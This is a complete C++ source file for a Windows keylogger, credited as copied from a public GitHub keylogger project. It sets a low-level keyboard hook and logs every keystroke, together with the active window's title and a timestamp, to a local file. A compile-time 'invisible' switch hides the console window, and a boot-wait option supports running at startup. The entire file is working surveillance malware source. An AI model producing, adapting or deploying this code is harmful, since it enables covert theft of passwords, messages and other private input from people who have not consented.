#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <thread>

// copied from: https://github.com/GiacomoLaw/Keylogger/blob/master/windows/klog_main.cpp
// 2024/02/07 source code last modified
// 2025/01/24 this file last modified

//////////////////////////////////////////////////////////////////////////

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)
// Defines whether you want to enable or disable 
// boot time waiting if running at system boot.
#define bootwait // (bootwait / nowait)
// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0
// defines if ignore mouseclicks
#define mouseignore
// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

#if FORMAT == 0
const std::map<int, std::string> keyname{ 
	{VK_BACK, "[BACKSPACE]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif

// A callback function for processing record by user.
typedef int (CALLBACK* Callback)(const char* record, void* user);

// Global variables.

HHOOK _hook = NULL;
Callback _cllback = NULL;
void* _user = NULL;

// Save parse keyboard information and use callback to process record.
int Save(int key_stroke)
{
	std::stringstream output;
	static char lastwindow[MAX_PATH] = {};
#ifndef mouseignore 
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; // ignore mouse clicks
	}
#endif
	HWND foreground = GetForegroundWindow();
	HKL layout = NULL;

	if (foreground)
	{
		// get keyboard layout of the thread
		DWORD threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[MAX_PATH] = {};
		GetWindowTextA(foreground, (LPSTR)window_title, MAX_PATH);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
			// get time
			struct tm tm_info;
			time_t t = time(NULL);
			localtime_s(&tm_info, &t);
			char s[64];
			strftime(s, sizeof(s), "%FT%X%z", &tm_info);

			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

#if FORMAT == 10
	output << '[' << key_stroke << ']';
#elif FORMAT == 16
	output << std::hex << "[" << key_stroke << ']';
#else
	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		// map virtual key according to keyboard layout
		char key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		// tolower converts it to lowercase properly
		if (!lowercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
#endif
	// instead of opening and closing file handlers every time, keep file open and flush.
	if (NULL != _cllback)
	{
		_cllback(output.str().c_str(), _user);
	}

	return 0;
}

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT WINAPI HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			// This struct contains the data received by the hook callback. As you see in the callback function
			// it contains the thing you will need: vkCode = virtual key code.
			KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// Set the hook and set it to use the callback function provided.
bool SetHook(Callback callback, void* user)
{
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (NULL != (_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		_cllback = callback;
		_user = user;
		return true;
	}
	return false;
}

// Release the hook.
void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
	_hook = NULL;
	_cllback = NULL;
	_user = NULL;
}

//////////////////////////////////////////////////////////////////////////
// BELOW IS AN EXAMPLE.

volatile bool g_shouldQuit = false;

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 5); // visible window
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	FreeConsole(); // Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
#endif
}

// Function to check if the system is still booting up
bool IsSystemBooting() 
{
	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

int CALLBACK Fwrite(const char* record, void* user) {
	std::ofstream* output_file = (std::ofstream*)user;
	*output_file << record;
	output_file->flush();
	std::cout << record;
	return 0;
}

BOOL WINAPI ConsoleEventHandler(DWORD eventType)
{
	switch (eventType)
	{
	case CTRL_C_EVENT:
	case CTRL_CLOSE_EVENT:
		g_shouldQuit = true;
		return TRUE;

	default:
		return FALSE;
	}
}

int main()
{
	// Unable to set `SetConsoleCtrlHandler`.
	if (!SetConsoleCtrlHandler(ConsoleEventHandler, TRUE))
	{
		return -1;
	}

	// Call the visibility of window function.
	Stealth(); 
	
	// Check if the system is still booting up
	#ifdef bootwait // If defined at the top of this file, wait for boot metrics.
	while (IsSystemBooting()) 
	{
		std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
		Sleep(10000); // Wait for 10 seconds before checking again
	}
	#endif
	#ifdef nowait // If defined at the top of this file, do not wait for boot metrics.
		std::cout << "Skipping boot metrics check.\n";
	#endif
	// This part of the program is reached once the system has 
	// finished booting up aka when the while loop is broken 
	// with the correct returned value.
	
	// Open the output file in append mode.
	// Feel free to rename this output file. 
	const char* output_filename = "keylogger.log";
	std::cout << "Logging output to " << output_filename << std::endl;
	std::ofstream output_file;
	output_file.open(output_filename, std::ios_base::app);

	// Call the hook function and set the hook.
	if (!SetHook(Fwrite, &output_file)) {
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}

	// We need a loop to keep the console application running.
	MSG msg;
	while (!g_shouldQuit)
	{
		while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE));
		std::this_thread::sleep_for(std::chrono::milliseconds(20));
	}
	output_file.close();
	ReleaseHook();
	return 0xDEAD;
}
